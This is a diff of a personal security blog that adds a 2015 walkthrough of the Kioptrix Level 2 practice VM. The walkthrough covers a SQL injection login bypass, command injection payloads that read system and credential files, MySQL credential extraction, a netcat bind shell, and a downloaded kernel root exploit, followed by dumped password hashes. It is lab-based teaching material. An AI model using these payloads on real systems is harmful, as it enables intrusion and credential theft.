@@ -9,7 +9,7 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: VulnImage: 1 Nmap output: 1
+  <meta name="description" content="Image: Kioptrix: Level 1.1 (#2) Nmap output: 1
 2
 3
 4
@@ -18,8 +18,8 @@
 7
 8
 PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 5.1p1 Debian 5 (protocol 2.0)
-25/tcp open smtp &hellip;">
+22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99)
+80/tcp open &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -75,6 +75,496 @@ PORT STATE SERVICE VERSION
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/11/kioptrix-level-2/">Kioptrix: Level 2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-11T19:15:08+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix: Level 1.1 (#2)</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE  VERSION
+</span><span class='line'>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+</span><span class='line'>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+</span><span class='line'>111/tcp  open  rpcbind  2 (RPC #100000)
+</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+</span><span class='line'>631/tcp  open  ipp      CUPS 1.1
+</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
+</span><span class='line'>MAC Address: 00:0C:29:53:19:4C (VMware)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We connect to the web page and log in using username / password (SQLi):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>test' or '1'='1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we got the access to the &ldquo;Basic Administrative Web Console&rdquo;. Trying command
+injection, we found out that we can inject arbitrary command and execute under
+web user privileges.</p>
+
+<p>Request / response example:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /pingit.php HTTP/1.1
+</span><span class='line'>Host: 192.168.80.144
+</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>DNT: 1
+</span><span class='line'>Referer: http://192.168.80.144/index.php
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Content-Length: 45
+</span><span class='line'>
+</span><span class='line'>ip=127.0.0.1 %26%26 cat /etc/passwd&submit=submit</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>HTTP/1.1 200 OK
+</span><span class='line'>Date: Sat, 09 May 2015 15:02:56 GMT
+</span><span class='line'>Server: Apache/2.0.52 (CentOS)
+</span><span class='line'>X-Powered-By: PHP/4.3.9
+</span><span class='line'>Content-Length: 2187
+</span><span class='line'>Connection: close
+</span><span class='line'>Content-Type: text/html; charset=UTF-8
+</span><span class='line'>
+</span><span class='line'>127.0.0.1 && cat /etc/passwd&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.008 ms
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.015 ms
+</span><span class='line'>
+</span><span class='line'>--- 127.0.0.1 ping statistics ---
+</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1999ms
+</span><span class='line'>rtt min/avg/max/mdev = 0.008/0.012/0.015/0.005 ms, pipe 2
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
+</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
+</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
+</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
+</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+</span><span class='line'>news:x:9:13:news:/etc/news:
+</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
+</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
+</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+</span><span class='line'>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
+</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
+</span><span class='line'>vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+</span><span class='line'>rpm:x:37:37::/var/lib/rpm:/sbin/nologin
+</span><span class='line'>haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+</span><span class='line'>netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
+</span><span class='line'>nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+</span><span class='line'>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+</span><span class='line'>rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+</span><span class='line'>mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+</span><span class='line'>smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+</span><span class='line'>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+</span><span class='line'>nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+</span><span class='line'>pcap:x:77:77::/var/arpwatch:/sbin/nologin
+</span><span class='line'>apache:x:48:48:Apache:/var/www:/sbin/nologin
+</span><span class='line'>squid:x:23:23::/var/spool/squid:/sbin/nologin
+</span><span class='line'>webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
+</span><span class='line'>xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
+</span><span class='line'>pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+</span><span class='line'>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+</span><span class='line'>john:x:500:500::/home/john:/bin/bash
+</span><span class='line'>harold:x:501:501::/home/harold:/bin/bash
+</span><span class='line'>&lt;/pre></span></code></pre></td></tr></table></div></figure>
+
+
+<p>Web server fingerprints:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+ Server: Apache/2.0.52 (CentOS)
+</span><span class='line'>+ Retrieved x-powered-by header: PHP/4.3.9</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We don&rsquo;t have writable access under DocumentRoot. Looking to different
+directories, we found the netcat source remains.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>drwxrwxrwx  7 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1
+</span><span class='line'>drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc/drafts
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/po
+</span><span class='line'>drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib/contrib
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/src
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/m4
+</span><span class='line'>drwxrwxr-x  5 root sys 4096 Oct  7  2009 /etc/cups
+</span><span class='line'>drwxr-xrwx  4 root root 4096 May  9 12:11 /tmp
+</span><span class='line'>drwxrwxrwt  2 root root 4096 May  9 10:17 /tmp/.ICE-unix
+</span><span class='line'>drwxrwxrwt  2 root root 4096 May  9 10:18 /tmp/.font-unix</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So there should be netcat installed, we will need this information later.</p>
+
+<p>We can read index.php for mysql credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 cat index.php&submit=submit
+</span><span class='line'>..
+</span><span class='line'>&lt;?php
+</span><span class='line'>  mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
+</span><span class='line'>  //print "Connected to MySQL&lt;br />";
+</span><span class='line'>  mysql_select_db("webapp");
+</span><span class='line'>  
+</span><span class='line'>  if ($_POST['uname'] != ""){
+</span><span class='line'>      $username = $_POST['uname'];
+</span><span class='line'>      $password = $_POST['psw'];
+</span><span class='line'>      $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
+</span><span class='line'>      //print $query."&lt;br>";
+</span><span class='line'>      $result = mysql_query($query);
+</span><span class='line'>
+</span><span class='line'>      $row = mysql_fetch_array($result);
+</span><span class='line'>      //print "ID: ".$row['id']."&lt;br />";
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>?></span></code></pre></td></tr></table></div></figure>
+
+
+<p>The john&rsquo;s password doesn&rsquo;t work for ssh, but at least we can extract more from
+mysql database:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 echo show databases|mysql -ujohn -phiroshima&submit=submit
+</span><span class='line'>Database
+</span><span class='line'>mysql
+</span><span class='line'>test
+</span><span class='line'>webapp
+</span><span class='line'>
+</span><span class='line'>ip=127.0.0.1 %26%26 echo 'use webapp; show tables'|mysql -ujohn -phiroshima&submit=submit
+</span><span class='line'>
+</span><span class='line'>id    username    password
+</span><span class='line'>1 admin   5afac8d85f
+</span><span class='line'>2 john    66lajGGbla</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again, the passwords don&rsquo;t work for ssh.</p>
+
+<p>We find netcat and use it to bind a shell, then we try to root the box:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 find / -iname \*netcat\*&submit=submit
+</span><span class='line'>..
+</span><span class='line'>/usr/share/zsh/4.2.0/functions/_netcat
+</span><span class='line'>/usr/local/info/netcat.info
+</span><span class='line'>/usr/local/share/locale/sk/LC_MESSAGES/netcat.mo
+</span><span class='line'>/usr/local/share/locale/it/LC_MESSAGES/netcat.mo
+</span><span class='line'>/usr/local/man/man1/netcat.1
+</span><span class='line'>/usr/local/bin/netcat
+</span><span class='line'>/usr/src/netcat-0.7.1
+</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.1
+</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.info
+</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.texi
+</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.pod
+</span><span class='line'>/usr/src/netcat-0.7.1/po/netcat.pot
+</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.c
+</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.h
+</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.o
+</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 /usr/local/bin/netcat -e /bin/sh -l -p 1337&submit=submit</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# nc 192.168.80.144 1337
+</span><span class='line'>
+</span><span class='line'>id
+</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
+</span><span class='line'>
+</span><span class='line'>uname -a
+</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Luckily, exploitdb contains local root exploit with exactly this version of kernel:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# grep -irn '2.6.9-55.EL' *
+</span><span class='line'>platforms/linux/local/9542.c:7:** CentOS 4.4(2.6.9-42.ELsmp), CentOS 4.5(2.6.9-55.ELsmp),</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As our last step, we download and compile this exploit
+<a href="https://www.exploit-db.com/exploits/9542/">https://www.exploit-db.com/exploits/9542/</a> .</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cd /tmp/
+</span><span class='line'>wget https://www.exploit-db.com/download/9542 -O 9542.c --no-check-certificate
+</span><span class='line'>
+</span><span class='line'>gcc 9542.c
+</span><span class='line'>./a.out
+</span><span class='line'>sh: no job control in this shell
+</span><span class='line'>sh-3.00# id
+</span><span class='line'>uid=0(root) gid=0(root) groups=48(apache)
+</span><span class='line'>sh-3.00# 
+</span><span class='line'>
+</span><span class='line'>sh-3.00# cat /etc/shadow
+</span><span class='line'>root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
+</span><span class='line'>bin:*:14525:0:99999:7:::
+</span><span class='line'>daemon:*:14525:0:99999:7:::
+</span><span class='line'>adm:*:14525:0:99999:7:::
+</span><span class='line'>lp:*:14525:0:99999:7:::
+</span><span class='line'>sync:*:14525:0:99999:7:::
+</span><span class='line'>shutdown:*:14525:0:99999:7:::
+</span><span class='line'>halt:*:14525:0:99999:7:::
+</span><span class='line'>mail:*:14525:0:99999:7:::
+</span><span class='line'>news:*:14525:0:99999:7:::
+</span><span class='line'>uucp:*:14525:0:99999:7:::
+</span><span class='line'>operator:*:14525:0:99999:7:::
+</span><span class='line'>games:*:14525:0:99999:7:::
+</span><span class='line'>gopher:*:14525:0:99999:7:::
+</span><span class='line'>ftp:*:14525:0:99999:7:::
+</span><span class='line'>nobody:*:14525:0:99999:7:::
+</span><span class='line'>dbus:!!:14525:0:99999:7:::
+</span><span class='line'>vcsa:!!:14525:0:99999:7:::
+</span><span class='line'>rpm:!!:14525:0:99999:7:::
+</span><span class='line'>haldaemon:!!:14525:0:99999:7:::
+</span><span class='line'>netdump:!!:14525:0:99999:7:::
+</span><span class='line'>nscd:!!:14525:0:99999:7:::
+</span><span class='line'>sshd:!!:14525:0:99999:7:::
+</span><span class='line'>rpc:!!:14525:0:99999:7:::
+</span><span class='line'>mailnull:!!:14525:0:99999:7:::
+</span><span class='line'>smmsp:!!:14525:0:99999:7:::
+</span><span class='line'>rpcuser:!!:14525:0:99999:7:::
+</span><span class='line'>nfsnobody:!!:14525:0:99999:7:::
+</span><span class='line'>pcap:!!:14525:0:99999:7:::
+</span><span class='line'>apache:!!:14525:0:99999:7:::
+</span><span class='line'>squid:!!:14525:0:99999:7:::
+</span><span class='line'>webalizer:!!:14525:0:99999:7:::
+</span><span class='line'>xfs:!!:14525:0:99999:7:::
+</span><span class='line'>ntp:!!:14525:0:99999:7:::
+</span><span class='line'>pegasus:!!:14525:0:99999:7:::
+</span><span class='line'>mysql:!!:14525::::::
+</span><span class='line'>john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
+</span><span class='line'>harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
+</span><span class='line'>sh-3.00#</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -3776,6 +4266,10 @@ know that the password for this file could be the same as for root.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2015/05/11/kioptrix-level-2/">Kioptrix: Level 2</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/05/10/vulnimage-1/">VulnImage: 1</a>
       </li>
     
@@ -3789,10 +4283,6 @@ know that the password for this file could be the same as for root.</p>
     
       <li class="post">
         <a href="/blog/2015/05/10/kioptrix-level-1/">Kioptrix: Level 1</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/05/10/pwnos-1-dot-0/">pWnOS: 1.0</a>
       </li>
     
   </ul>
